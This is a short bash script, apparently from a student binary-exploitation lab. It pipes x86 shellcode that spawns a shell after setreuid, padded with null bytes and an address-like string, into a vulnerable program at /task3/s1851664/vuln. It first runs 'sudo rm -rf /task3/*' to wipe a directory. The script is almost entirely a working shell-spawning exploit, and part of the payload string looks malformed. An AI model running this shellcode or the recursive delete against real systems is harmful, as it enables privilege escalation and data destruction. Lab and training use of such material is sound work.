#!/usr/bin/env bash
echo "Starting script" 
echo "Cleaning working environment\n Enter 'student' for sudo access "
sudo rm -rf /task3/*
SHELLCODE='\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80'
null=$(echo '00' | sed 's/../\\x&/g')
middle="/x01/xe3/x02/xb2"
echo -en "$SHELLCODE${null}$middle${null}"  | \ 
  /task3/s1851664/vuln